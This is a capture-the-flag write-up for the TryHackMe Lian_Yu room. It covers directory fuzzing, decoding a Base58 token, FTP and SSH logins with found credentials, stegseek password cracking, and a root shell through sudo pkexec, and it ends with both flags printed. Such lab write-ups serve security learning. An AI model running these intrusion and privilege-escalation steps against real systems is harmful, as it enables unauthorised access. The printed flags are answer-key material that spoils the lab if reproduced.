# Lian_Yu TryHackMe Write-up

Room: TryHackMe Lian_Yu  
Target IP: `10.129.169.171`

---

# Reconnaissance

First, I verified that the target machine was alive using `ping`:

```bash
ping 10.129.169.171
```

Output:

```bash
PING 10.129.169.171 (10.129.169.171) 56(84) bytes of data.
64 bytes from 10.129.169.171: icmp_seq=1 ttl=62 time=521 ms
```

The host responded successfully, confirming the machine was reachable.

---

# Web Enumeration

I started directory fuzzing with `ffuf`:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.169.171/FUZZ
```

This revealed the `/island` directory.

---

# Discovering the First Hint

Browsing `/island`, I found the following hint inside the page source:

```html
The Code Word is:
vigilante
```

At this point, `vigilante` looked like a possible username or password.

---

# More Enumeration

I continued fuzzing inside `/island`:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.169.171/island/FUZZ
```

This revealed:

```text
/island/2100
```

Inside `/island/2100`, I found an HTML comment:

```html
<!-- you can avail your .ticket here but how? -->
```

This suggested that a `.ticket` file existed.

---

# Finding the Ticket File

I searched for files with the `.ticket` extension:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.169.171/island/2100/FUZZ -e .ticket
```

Result:

```text
green_arrow.ticket
```

The file contained:

```text
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

---

# Decoding the Token

The string `RTy8yhBQdscX` was Base58 encoded.

After decoding it, I obtained:

```text
!#th3h00d
```

Now I had possible credentials:

```text
Username: vigilante
Password: !#th3h00d
```

---

# FTP Access

I attempted to log into the FTP service:

```bash
ftp 10.129.169.171
```

Using:

```text
Username: vigilante
Password: !#th3h00d
```

The login was successful.

---

# Enumerating the FTP Server

Listing the files revealed:

```text
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
```

I downloaded all files using:

```bash
get Leave_me_alone.png
get Queen's_Gambit.png
get aa.jpg
```

---

# Steganography

Since `aa.jpg` looked suspicious, I used `stegseek`:

```bash
stegseek aa.jpg /usr/share/wordlists/rockyou.txt
```

Result:

```text
Found passphrase: "password"
Original filename: "ss.zip"
```

The hidden archive was extracted successfully.

---

# Extracting the ZIP File

I extracted the archive:

```bash
unzip ss.zip
```

Files extracted:

```text
passwd.txt
shado
```

Contents of `passwd.txt`:

```text
This is your visa to Land on Lian_Yu
```

Contents of `shado`:

```text
M3tahuman
```

This strongly suggested that `M3tahuman` was a password.

---

# SSH Access

Earlier during enumeration, I discovered the username `slade` on the FTP server.

I tried SSH credentials:

```text
Username: slade
Password: M3tahuman
```

Connection:

```bash
ssh slade@10.129.169.171
```

Login was successful.

---

# User Flag

Inside the home directory:

```bash
ls
```

Output:

```text
user.txt
```

Reading the file:

```bash
cat user.txt
```

Flag:

```text
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

---

# Privilege Escalation

I checked sudo permissions:

```bash
sudo -l
```

Output:

```text
(root) PASSWD: /usr/bin/pkexec
```

The user `slade` was allowed to run `pkexec` as root.

I executed:

```bash
sudo pkexec /bin/bash
```

After authentication, I obtained a root shell.

Verification:

```bash
whoami
```

Output:

```text
root
```

---

# Root Flag

Navigating to `/root`:

```bash
cd /root
ls
```

I found:

```text
root.txt
```

Reading the file:

```bash
cat root.txt
```

Flag:

```text
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

---

# Conclusion

This room focused heavily on:

- web enumeration
    
- directory fuzzing
    
- hidden file discovery
    
- steganography
    
- credential reuse
    
- privilege escalation with `pkexec`
    

Key tools used:

- `ffuf`
    
- `ftp`
    
- `stegseek`
    
- `unzip`
    
- `ssh`
    
- `sudo`